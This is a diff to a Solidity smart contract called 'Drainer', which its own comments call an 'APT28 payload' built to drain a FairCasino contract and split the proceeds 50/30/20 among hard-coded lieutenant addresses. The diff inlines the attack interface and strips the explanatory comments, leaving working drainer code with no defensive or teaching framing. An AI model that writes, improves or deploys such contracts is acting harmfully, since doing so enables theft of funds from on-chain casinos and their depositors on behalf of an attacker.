@@ -1,16 +1,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.28;
 
-import {IDrainer} from "./IDrainer.sol";
+// ─── IDrainer (per APT28 README spec) ────────────────────────────────────────
+interface IDrainer {
+    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable;
+    function distribute() external;
+}
 
-/// @notice Minimal interface to interact with the FairCasino target.
+// ─── External targets ────────────────────────────────────────────────────────
 interface IFairCasino {
     function play(uint256 guess, uint256 round, uint256 nonce) external payable;
     function currentRound() external view returns (uint256);
     function jackpotReserve() external view returns (uint256);
 }
 
-/// @notice Minimal interface to read the Chainlink BTC/USD price feed.
 interface IAggregatorV3 {
     function latestRoundData()
         external
@@ -18,6 +21,7 @@ interface IAggregatorV3 {
         returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
 }
 
+// ─── Drainer ─────────────────────────────────────────────────────────────────
 /**
  * @title Drainer
  * @notice APT28 payload — drains FairCasino atomically and splits proceeds 50/30/20.
@@ -61,13 +65,8 @@ contract Drainer is IDrainer {
     function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable override {
         require(msg.value >= TICKET_PRICE, "Drainer: send >= 0.01 ETH");
 
-        // Forward exactly the ticket price; if the caller sent extra, it sticks here
-        // and gets distributed alongside the jackpot at the end of this transaction.
         IFairCasino(TARGET).play{value: TICKET_PRICE}(_guess, _round, _nonce);
 
-        // FairCasino.play() does NOT revert on a wrong guess — it silently logs a loss.
-        // Therefore, after a successful call, our balance reveals whether we won.
-        // Either way, we forward whatever remains atomically to the lieutenants.
         uint256 bal = address(this).balance;
         emit Strike(_round, bal);
 
@@ -77,9 +76,6 @@ contract Drainer is IDrainer {
     }
 
     /// @inheritdoc IDrainer
-    /// @dev Idempotent. Callable by anyone — the destinations are hard-coded so there is
-    ///      no way to redirect funds. Useful as a safety net should `attack()` ever be
-    ///      called with msg.value == 0 and a stray balance is sitting on the contract.
     function distribute() external override {
         uint256 bal = address(this).balance;
         require(bal > 0, "Drainer: nothing to distribute");
@@ -87,7 +83,6 @@ contract Drainer is IDrainer {
     }
 
     function _distribute(uint256 bal) internal {
-        // 50% / 30% / 20% — residual to LT3 to ensure no dust is left behind.
         uint256 amount1 = (bal * 50) / 100;
         uint256 amount2 = (bal * 30) / 100;
         uint256 amount3 = bal - amount1 - amount2;
@@ -100,6 +95,5 @@ contract Drainer is IDrainer {
         emit Distributed(amount1, amount2, amount3);
     }
 
-    /// @notice Required to receive payouts from FairCasino.
     receive() external payable {}
 }
